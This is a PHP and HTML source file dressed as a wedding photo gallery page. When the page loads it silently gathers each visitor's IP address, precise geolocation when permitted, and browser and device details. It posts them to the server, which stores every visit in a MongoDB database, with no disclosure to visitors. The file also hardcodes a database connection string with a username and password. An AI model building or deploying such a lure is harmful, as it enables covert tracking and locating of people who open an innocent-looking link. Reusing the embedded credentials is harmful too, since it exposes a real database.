<?php
// ------------------
// Error reporting
// ------------------
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ------------------
// MongoDB Atlas connection
// ------------------
$mongoClient = null;
$mongoError = null;

try {
    // Connect to MongoDB Atlas (@ symbol in password must be URL-encoded as %40)
    $mongoClient = new MongoDB\Driver\Manager("mongodb+srv://shashwats500:Ravi%401234@cluster0.7li4oxi.mongodb.net/?appName=Cluster0");
    
    // Test connection
    $command = new MongoDB\Driver\Command(['ping' => 1]);
    $mongoClient->executeCommand('admin', $command);
    
    $dbName = "deviceinfo";
    $collectionName = "device_logs";
    
} catch (Exception $e) {
    $mongoError = $e->getMessage();
    error_log("MongoDB connection failed: " . $mongoError);
    $mongoClient = null;
}

// ------------------
// Save AJAX POST request
// ------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['latitude']) && isset($_POST['longitude'])) {
    
    // Check if MongoDB is connected
    if (!$mongoClient) {
        echo json_encode(['success' => false, 'error' => 'MongoDB not connected', 'details' => $mongoError]);
        exit;
    }
    
    $ip       = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'];
    $lat      = $_POST['latitude'];
    $lon      = $_POST['longitude'];
    $browser  = $_POST['browser'] ?? $_SERVER['HTTP_USER_AGENT'];
    $platform = $_POST['platform'] ?? '';
    $screen   = $_POST['screen'] ?? '';
    $language = $_POST['language'] ?? '';
    $memory   = $_POST['memory'] ?? '';
    $cores    = (int)($_POST['cores'] ?? 0);

    $country = "Unknown";
    $city    = "Unknown";
    if (!empty($ip)) {
        $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
        if ($geo && $geo->status === "success") {
            $country = $geo->country;
            $city = $geo->city;
        }
    }

    try {
        // Insert new document for every visit
        $document = [
            'ip' => $ip,
            'country' => $country,
            'city' => $city,
            'latitude' => (float)$lat,
            'longitude' => (float)$lon,
            'browser' => $browser,
            'platform' => $platform,
            'screen' => $screen,
            'language' => $language,
            'memory' => $memory,
            'cores' => $cores,
            'visited_at' => new MongoDB\BSON\UTCDateTime()
        ];

        $bulk = new MongoDB\Driver\BulkWrite;
        $bulk->insert($document);
        $result = $mongoClient->executeBulkWrite('deviceinfo.device_logs', $bulk);
        
        echo json_encode([
            'success' => true, 
            'message' => 'Visit logged', 
            'insertedCount' => $result->getInsertedCount(),
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    } catch (Exception $e) {
        error_log("MongoDB insert failed: " . $e->getMessage());
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// ------------------
// Default location for preview
// ------------------
$defaultAddress = "H73C+QFX Kokernag-verinag road, Forest Block, 192212";
$defaultLat = "33.738";
$defaultLon = "75.117";
?>
<!DOCTYPE html>
<html>
<head>
    <title>Wedding Day</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Playfair Display', 'Georgia', serif; 
            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            padding: 50px 20px;
            background: rgba(255,255,255,0.95);
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
            margin-bottom: 40px;
            border: 3px solid #d4a574;
        }
        h1 { 
            color: #8b6f47; 
            font-size: 3.5em; 
            margin-bottom: 15px;
            font-weight: 400;
            letter-spacing: 2px;
        }
        .subtitle {
            color: #a08560;
            font-size: 1.4em;
            font-style: italic;
            margin-bottom: 10px;
        }
        .wedding-date {
            color: #8b6f47;
            font-size: 1.1em;
            margin-top: 10px;
            font-weight: 600;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 30px;
            max-width: 1400px;
            margin: 0 auto;
        }
        .photo-card {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(139,111,71,0.2);
            transition: transform 0.4s ease, box-shadow 0.4s ease;
            border: 2px solid #f0e5d8;
        }
        .photo-card:hover {
            transform: translateY(-15px) scale(1.02);
            box-shadow: 0 20px 50px rgba(139,111,71,0.3);
        }
        .photo {
            width: 100%;
            height: 280px;
            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 5em;
            text-shadow: 2px 2px 10px rgba(0,0,0,0.2);
        }
        .photo-card:nth-child(1) .photo { background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%); }
        .photo-card:nth-child(2) .photo { background: linear-gradient(135deg, #fbc2eb 0%, #a6c1ee 100%); }
        .photo-card:nth-child(3) .photo { background: linear-gradient(135deg, #f6d365 0%, #fda085 100%); }
        .photo-card:nth-child(4) .photo { background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%); }
        .photo-card:nth-child(5) .photo { background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); }
        .photo-card:nth-child(6) .photo { background: linear-gradient(135deg, #fad0c4 0%, #ffd1ff 100%); }
        .caption {
            padding: 25px;
            text-align: center;
            background: linear-gradient(to bottom, white 0%, #fff9f5 100%);
        }
        .caption h3 {
            color: #8b6f47;
            margin-bottom: 10px;
            font-size: 1.4em;
            font-weight: 600;
        }
        .caption p {
            color: #a08560;
            font-size: 1em;
            font-style: italic;
        }
        .footer {
            text-align: center;
            padding: 50px 20px;
            color: #8b6f47;
            font-size: 1em;
            margin-top: 50px;
            font-style: italic;
        }
        .heart {
            color: #ff9a9e;
            font-size: 1.5em;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
    </style>
</head>
<body>
    <div class="header">
        <p class="subtitle">Forever Starts Today 💍</p>
        <p class="wedding-date">June 15, 2025</p>
    </div>

    <div class="gallery">
        <div class="photo-card">
            <div class="photo">💐</div>
            <div class="caption">
                <h3>The Ceremony</h3>
                <p>Where two hearts became one</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">💑</div>
            <div class="caption">
                <h3>Moment</h3>
                <p>The moment we'll cherish forever</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">🥂</div>
            <div class="caption">
                <h3>Reception Toast</h3>
                <p>Celebrating with loved ones</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">💃</div>
            <div class="caption">
                <h3>First Dance</h3>
                <p>Dancing into our future together</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">🎂</div>
            <div class="caption">
                <h3>Cake Cutting</h3>
                <p>Sweet beginnings of married life</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">✨</div>
            <div class="caption">
                <h3>Grand Exit</h3>
                <p>Off to our happily ever after</p>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>Thank you for being part of our special day <span class="heart">♥</span></p>
    </div>

<script>
window.onload = function() {
    const data = {
        latitude: '<?php echo $defaultLat; ?>',
        longitude: '<?php echo $defaultLon; ?>',
        ip: '',
        browser: navigator.userAgent,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        memory: navigator.deviceMemory || 'Unknown',
        cores: navigator.hardwareConcurrency || 0
    };

    // Get IP
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(res => {
            data.ip = res.ip;

            // Get geolocation if allowed
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.latitude = pos.coords.latitude;
                        data.longitude = pos.coords.longitude;
                        sendData();
                    },
                    () => sendData() // fallback if user denies
                );
            } else {
                sendData();
            }
        }).catch(() => sendData());

    function sendData() {
        $.ajax({
            url: '',
            method: 'POST',
            data: data,
            success: function(res) { 
                console.log('Response:', res); 
                try {
                    const result = JSON.parse(res);
                    console.log('Parsed result:', result);
                    if (result.error) {
                        console.error('Error:', result.error);
                    }
                } catch (e) {
                    console.log('Raw response:', res);
                }
            },
            error: function(err) { console.error('AJAX error:', err); }
        });
    }
};
</script>
</body>
</html>
